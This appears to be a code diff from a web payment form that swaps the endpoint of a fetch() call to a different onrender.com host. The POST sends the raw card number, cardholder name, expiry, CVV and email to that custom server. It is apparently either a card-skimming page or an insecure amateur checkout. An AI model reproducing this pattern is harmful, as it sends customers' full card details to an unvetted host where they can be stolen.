@@ -127,7 +127,7 @@
 
       status.innerText = "🔄 Verifying payment...";
       try {
-        const res = await fetch("https://server-ceef.onrender.com", {
+        const res = await fetch("https://backen-zwt8.onrender.com", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ ref, email, cardName, cardNumber, expDate, cvv, amount: 1000 })
